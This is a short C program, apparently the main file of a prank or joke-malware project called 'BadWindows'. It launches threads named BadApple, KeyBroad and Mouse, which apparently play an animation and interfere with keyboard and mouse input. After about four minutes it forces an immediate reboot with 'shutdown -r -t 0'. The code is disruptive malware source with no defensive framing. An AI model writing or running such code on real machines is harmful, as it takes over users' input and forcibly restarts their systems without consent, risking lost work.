#include"BadWindows.h"

int main()
{   
    //创建相关线程

    HANDLE ba_t = CreateThread(NULL, 5, (LPTHREAD_START_ROUTINE)BadApple, NULL, 0, NULL);
    HANDLE key_t = CreateThread(NULL, 5, (LPTHREAD_START_ROUTINE)KeyBroad, NULL, 0, NULL);
    HANDLE mos_t = CreateThread(NULL, 5, (LPTHREAD_START_ROUTINE)Mouse, NULL, 0, NULL);

    Sleep(250000);
    system("shutdown -r -t 0");

}